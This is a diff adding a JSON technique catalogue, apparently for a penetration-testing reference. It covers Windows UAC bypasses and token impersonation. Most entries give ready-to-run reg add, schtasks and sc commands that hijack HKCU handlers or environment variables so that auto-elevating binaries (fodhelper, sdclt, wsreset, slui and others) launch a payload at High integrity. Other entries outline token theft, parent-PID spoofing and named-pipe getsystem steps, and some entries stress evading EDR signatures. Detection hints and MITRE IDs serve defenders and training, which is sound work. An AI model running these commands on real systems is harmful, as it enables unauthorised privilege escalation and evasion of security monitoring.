@@ -1,0 +1,505 @@
+{
+  "phase": {
+    "id": "uac-token-impersonation",
+    "title": "UAC Bypass & Token Impersonation",
+    "summary": "Bypass User Account Control to elevate from Medium IL to High IL, plus low-level token impersonation primitives.",
+    "icon": "shield-off"
+  },
+  "nodes": [
+    {
+      "id": "uac-fodhelper",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "fodhelper.exe registry hijack",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "fodhelper auto-elevates and reads a HKCU registry key — point it at your payload.",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Stage HKCU key and trigger",
+          "code": "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"C:\\Temp\\payload.exe\" /f\nfodhelper.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1548.002",
+          "url": "https://attack.mitre.org/techniques/T1548/002/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "fodhelper.exe (`C:\\Windows\\System32\\fodhelper.exe`) is an auto-elevating binary that manages optional Windows features. It reads handler configuration from the `ms-settings` COM extension class, which is resolved through the registry — checking `HKCU` before `HKLM`.\n\n**Why it works**: fodhelper's manifest includes `requireAdministrator` + `autoElevate`, so Windows UAC silently elevates it. When it launches, it opens an `ms-settings:` URL, consulting `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`. Since HKCU is writable by the current user, pointing this command at your payload spawns a High-integrity child process.\n\n**Steps**:\n1. `reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /f` (empty DelegateExecute forces shell to use the open command)\n2. `reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"C:\\Temp\\payload.exe\" /f`\n3. `fodhelper.exe` — spawns payload at High integrity\n\n**Cleanup**: `reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f`\n\n**Applicability**: Works on Windows 10 and Server 2016+. Does not work if UAC is set to 'Always notify' (max level) or if the user isn't in the Administrators group.",
+      "detection_hints": "Writes to `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command` (Sysmon EID 13); fodhelper.exe spawning unexpected child processes; process integrity level jump from Medium to High."
+    },
+    {
+      "id": "uac-eventvwr",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "eventvwr.exe HKCU hijack",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Classic eventvwr bypass (older builds) — patched on modern Win10 but works on Server 2016 / Win10 1607.",
+      "tags": [
+        "uac-bypass",
+        "registry",
+        "legacy"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "HKCU mscfile hijack",
+          "code": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"C:\\Temp\\payload.exe\" /f\neventvwr.exe"
+        }
+      ],
+      "references": [],
+      "description_md": "eventvwr.exe (Event Viewer) is auto-elevating and queries the `mscfile` COM class handler when launched. On Windows 7, 8, and Server 2008-2012, and unpatched Windows 10 1607, it reads the handler from `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command` before HKLM, allowing a per-user handler override.\n\n**Classic exploitation**:\n1. `reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f`\n2. `eventvwr.exe` — spawns payload at High integrity\n\n**Scope**: Patched in Windows 10 FCU (1703) by making eventvwr.exe no longer auto-elevate via this path. Still functional on:\n- Windows 7 / Windows 8.1\n- Windows Server 2008 / 2012 / 2012 R2\n- Windows Server 2016\n- Unpatched Win10 builds prior to 1703\n\n**Detection circumvention**: Because it's HKCU, no admin rights are needed to set up the trigger.",
+      "detection_hints": "HKCU mscfile handler registry writes; eventvwr.exe spawning unexpected children; process integrity escalation from Medium to High."
+    },
+    {
+      "id": "uac-sdclt",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "sdclt.exe App-Paths bypass",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Use App Paths under HKCU to redirect sdclt's child invocation.",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "App-Paths hijack",
+          "code": "reg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /v IsolatedCommand /d \"C:\\Temp\\payload.exe\" /f\nsdclt.exe /KickOffElev"
+        }
+      ],
+      "references": [],
+      "description_md": "sdclt.exe (Backup and Restore) is auto-elevating and launches a helper process that resolves execution path through the `exefile` COM handler or a specific App Paths subkey under HKCU. The `/KickOffElev` switch forces an elevation event that reads from HKCU registry paths the attacker can control.\n\n**Technique variations**:\n\n**Variant 1 — exefile IsolatedCommand**:\n```cmd\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /v IsolatedCommand /d \"C:\\Temp\\payload.exe\" /f\nsdclt.exe /KickOffElev\n```\n\n**Variant 2 — Folder handler**:\n```cmd\nreg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /v DelegateExecute /f\nsdclt.exe\n```\n\n**Applicability**: Reliable on Windows 10 1703+ (where eventvwr was patched). Check UACME for the current working variant per build.",
+      "detection_hints": "Writes to `HKCU\\Software\\Classes\\exefile\\shell\\runas\\command` or `Folder\\shell\\open\\command`; sdclt.exe spawning non-backup children; UAC prompt absence for admin-level process."
+    },
+    {
+      "id": "uac-computerdefaults",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "computerdefaults.exe bypass",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Same ms-settings hijack pattern as fodhelper, alternate trigger binary.",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Trigger via computerdefaults",
+          "code": "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /f\ncomputerdefaults.exe"
+        }
+      ],
+      "references": [],
+      "description_md": "computerdefaults.exe (\"Default Apps\" settings UI) is auto-elevating and, like fodhelper, reads its launch configuration from the `ms-settings` COM extension class. Because it uses the same HKCU registry path as fodhelper, the exploitation technique is identical — different trigger binary.\n\n**Why use computerdefaults over fodhelper**:\n- Some EDR/SIEM products have specific signatures for fodhelper process chains\n- computerdefaults.exe provides an alternative trigger when fodhelper is monitored\n- Both present the same HKCU registry hijack opportunity\n\n**Steps** (identical to fodhelper):\n1. Write empty `DelegateExecute` to `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`\n2. Write your payload path as the default value of the same key\n3. Execute `computerdefaults.exe`\n\n**Cleanup**: Delete `HKCU\\Software\\Classes\\ms-settings\\` key after exploitation.",
+      "detection_hints": "Same detection signals as uac-fodhelper; computerdefaults.exe spawning unexpected children; HKCU ms-settings handler modification."
+    },
+    {
+      "id": "uac-icmluautil",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ICMLuaUtil COM elevation",
+      "severity": "high",
+      "difficulty": "red-team",
+      "summary": "COM-object based bypass using the ICMLuaUtil interface; commonly seen in red-team tooling.",
+      "tags": [
+        "uac-bypass",
+        "com"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Concept",
+          "code": "Spawn IElevatedFactoryServer via ICMLuaUtil to launch payload from an auto-elevating IFileOperation context."
+        }
+      ],
+      "references": [],
+      "description_md": "ICMLuaUtil is an internal COM interface (`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`) used by Windows setup components to run elevated operations. It exposes a `ShellExec` method that executes a program at High integrity when invoked through the COM elevation moniker.\n\n**How it works**: The COM server implementing ICMLuaUtil is registered to auto-elevate via UAC COM elevation. By instantiating it through `CoCreateInstance` with the `CLSCTX_LOCAL_SERVER` flag and the elevation moniker, a medium-integrity process can invoke methods that run code at high integrity.\n\n**Implementation**: Implemented in custom C++ or .NET (e.g., via UACMe technique #41). No registry modifications needed — purely COM-based.\n\n**UACME implementation**: Listed as a method in the UACME framework (github.com/hfiref0x/UACME). The exact CLSID may change between Windows builds — consult the UACME method index for the current valid entry.\n\n**Limitation**: Requires the user to be in the local Administrators group and UAC to be enabled but not at max level.",
+      "detection_hints": "COM activation of IElevatedFactoryServer or ICMLuaUtil CLSIDs from non-elevated processes; unusual COM server instantiation chains involving auto-elevating COM objects."
+    },
+    {
+      "id": "uac-token-theft",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Token theft via OpenProcessToken / DuplicateTokenEx",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "summary": "With SeDebug, duplicate a high-IL process token and start a new process with it.",
+      "related": [
+        "priv-se-debug"
+      ],
+      "mitre_attack_id": "T1134.001",
+      "tags": [
+        "token-theft",
+        "impersonation"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Demo via Invoke-TokenManipulation",
+          "code": "Invoke-TokenManipulation -CreateProcess cmd.exe -ProcessId <pid-of-high-il-proc>"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "With SeDebugPrivilege, an attacker can open any running process (including those at High or System integrity), duplicate their primary or impersonation token, and use it to spawn a new process at the target's integrity level.\n\n**Step-by-step**:\n1. `OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, pid_of_high_il_proc)`\n2. `OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_IMPERSONATE)`\n3. `DuplicateTokenEx` → `TokenPrimary` (for `CreateProcessWithTokenW`)\n4. `CreateProcessWithTokenW` or `CreateProcessAsUserW` with the duplicated token\n\n**Targets**: Processes running at High integrity (UAC-elevated) or SYSTEM (winlogon, services). This is also the mechanism behind `Invoke-TokenManipulation` and Meterpreter's `getsystem`.\n\n**Token impersonation vs. primary token**: Impersonation tokens (via `ImpersonateLoggedOnUser`) work for the current thread only. Creating a new process requires a primary token (`DuplicateTokenEx` with `TokenPrimary`).",
+      "detection_hints": "SeDebugPrivilege-enabled process calling OpenProcess on high-integrity processes; DuplicateTokenEx + CreateProcessWithTokenW API sequence (Sysmon EID 10 for process access); process integrity jumps."
+    },
+    {
+      "id": "uac-named-pipe",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Named-pipe impersonation primitive",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "summary": "Create a server pipe, coerce a privileged client to connect, then ImpersonateNamedPipeClient.",
+      "description_md": "Underpins the entire Potato family. Worth understanding the primitive even when using a Potato wrapper.",
+      "tags": [
+        "impersonation",
+        "named-pipe",
+        "potato"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Primitive (pseudo)",
+          "code": "1. CreateNamedPipeW(\\\\.\\pipe\\xyz, PIPE_ACCESS_DUPLEX, ...)\n2. Coerce a privileged client to connect (Spooler / EFSR / DCOM)\n3. ConnectNamedPipe / ReadFile\n4. ImpersonateNamedPipeClient(hPipe)\n5. OpenThreadToken + CreateProcessWithTokenW"
+        }
+      ],
+      "references": []
+    },
+    {
+      "id": "uac-slui-hijack",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "slui.exe registry hijack",
+      "summary": "Auto-elevated slui.exe launches a hijacked verb handler at High integrity.",
+      "description_md": "`slui.exe` is auto-elevating. Hijack the `exefile`/`.exe` open command under `HKCU` so launching slui spawns your payload elevated. A classic fileless UAC bypass requiring no admin to set up.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "detection_hints": "HKCU\\Software\\Classes\\<class>\\shell\\open\\command writes followed by slui.exe spawning a child.",
+      "tags": [
+        "uac-bypass",
+        "registry",
+        "auto-elevate"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Set hijack & trigger",
+          "code": "reg add \"HKCU\\Software\\Classes\\exefile\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\open\\command\" /v DelegateExecute /f\nslui.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "UACME — technique reference",
+          "url": "https://github.com/hfiref0x/UACME",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "uac-wsreset",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "wsreset.exe bypass",
+      "summary": "Auto-elevated Store reset tool runs a hijacked app-path command elevated.",
+      "description_md": "`WSReset.exe` auto-elevates and resolves a command from `HKCU\\Software\\Classes\\AppX...\\Shell\\open\\command`. Plant your command there, run wsreset, get a High-integrity process.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "registry",
+        "auto-elevate"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Hijack & trigger",
+          "code": "reg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" /v DelegateExecute /f\nWSReset.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — UAC bypass",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "uac-silent-cleanup",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "SilentCleanup scheduled task",
+      "summary": "Abuse the SilentCleanup task that runs Highest while expanding %windir%.",
+      "description_md": "The built-in `SilentCleanup` task runs at highest privileges and executes `%windir%\\system32\\cleanmgr.exe`. As a normal user you can set `windir` in your environment to a command, then trigger the task — it runs your command elevated.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "scheduled-task",
+        "env-var"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Env hijack & trigger",
+          "code": "reg add \"HKCU\\Environment\" /v windir /d \"cmd /c C:\\Temp\\payload.exe ;\" /f\nschtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — UAC bypass",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "uac-compmgmtlauncher",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "CompMgmtLauncher.exe bypass",
+      "summary": "Legacy auto-elevated launcher resolves a hijacked mscfile handler.",
+      "description_md": "On older builds, `CompMgmtLauncher.exe` auto-elevates and opens an MMC via the `mscfile` class handler. Hijack `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command` to run elevated. Same pattern as the eventvwr bypass.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "related": [
+        "uac-eventvwr"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Hijack & trigger",
+          "code": "reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nCompMgmtLauncher.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "UACME",
+          "url": "https://github.com/hfiref0x/UACME",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "uac-dccw",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "dccw.exe bypass",
+      "summary": "Display Color Calibration tool auto-elevates and is abusable via DLL/handler.",
+      "description_md": "`dccw.exe` auto-elevates and can be chained with a control-panel/handler hijack to launch an elevated payload. Useful where the more common handlers are monitored.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "auto-elevate"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Approach",
+          "code": "dccw.exe auto-elevates; pair with an IFileOperation/handler hijack to drop+run a High-integrity payload. See UACME method index for the current working variant per build."
+        }
+      ],
+      "references": [
+        {
+          "title": "UACME",
+          "url": "https://github.com/hfiref0x/UACME",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "uac-fodhelper-curver",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "fodhelper CurVer variant",
+      "summary": "A stealthier fodhelper bypass using the ms-settings CurVer redirection.",
+      "description_md": "Instead of writing the `ms-settings\\shell\\open\\command` directly, redirect the class via `CurVer` to a custom ProgID you control. Evades signatures that only watch the canonical fodhelper key.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "related": [
+        "uac-fodhelper"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "CurVer redirect",
+          "code": "reg add \"HKCU\\Software\\Classes\\.pwn\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".pwn\" /f\nfodhelper.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — UAC bypass",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "uac-disk-cleanup-env",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Environment-variable expansion abuse",
+      "summary": "Auto-elevated tasks/binaries that expand user-controlled env vars run your code.",
+      "description_md": "Several auto-elevated tasks build their command line from environment variables (e.g. `windir`, `SystemRoot`). Where the variable is read from `HKCU\\Environment` first, a normal user can inject a command. The SilentCleanup task is the canonical example.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "env-var"
+      ],
+      "related": [
+        "uac-silent-cleanup"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Inspect user env",
+          "code": "reg query HKCU\\Environment"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — UAC bypass",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "uac-ppid-spoof",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Parent PID spoofing",
+      "summary": "Spawn a child under an elevated parent to inherit a High-integrity token.",
+      "description_md": "With a handle to an elevated process you can set it as the explicit parent (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) of a new process, inheriting its token. Combined with token duplication this yields elevation and breaks naive parent-child detections.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1134.004",
+      "detection_hints": "Mismatch between logged parent PID and the actual spawning process; unusual CreateProcess attribute lists.",
+      "tags": [
+        "token",
+        "ppid-spoof",
+        "impersonation"
+      ],
+      "related": [
+        "priv-se-debug"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Concept",
+          "code": "1. OpenProcess(elevated_pid) with PROCESS_CREATE_PROCESS\n2. InitializeProcThreadAttributeList + UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)\n3. CreateProcess(payload.exe, EXTENDED_STARTUPINFO_PRESENT)"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1134.004 — Parent PID Spoofing",
+          "url": "https://attack.mitre.org/techniques/T1134/004/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "uac-getsystem-namedpipe",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "GetSystem via service + named pipe",
+      "summary": "Create a service that connects to your pipe; impersonate the SYSTEM client.",
+      "description_md": "The Metasploit `getsystem` technique: with admin (High integrity) create a temporary service whose command writes to a named pipe you host; when the SYSTEM service connects, impersonate the pipe client to obtain a SYSTEM token.",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.001",
+      "tags": [
+        "token",
+        "named-pipe",
+        "getsystem"
+      ],
+      "related": [
+        "uac-named-pipe"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Service → pipe",
+          "code": "sc create svcpwn binPath= \"cmd /c echo x > \\\\.\\pipe\\svcpwn\" & sc start svcpwn",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — Named Pipe Impersonation",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "uac-ms-settings-delegate",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ms-settings DelegateExecute bypass",
+      "summary": "Empty DelegateExecute forces the shell to use your open command, elevated.",
+      "description_md": "The fodhelper/computerdefaults family resolves `ms-settings`. Adding an empty `DelegateExecute` value next to your `command` makes the shell honor your command rather than the COM delegate — the reliable form of the bypass on modern builds.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1548.002",
+      "tags": [
+        "uac-bypass",
+        "registry"
+      ],
+      "related": [
+        "uac-computerdefaults"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Full key set",
+          "code": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\ncomputerdefaults.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "UACME",
+          "url": "https://github.com/hfiref0x/UACME",
+          "kind": "tool"
+        }
+      ]
+    }
+  ]
+}
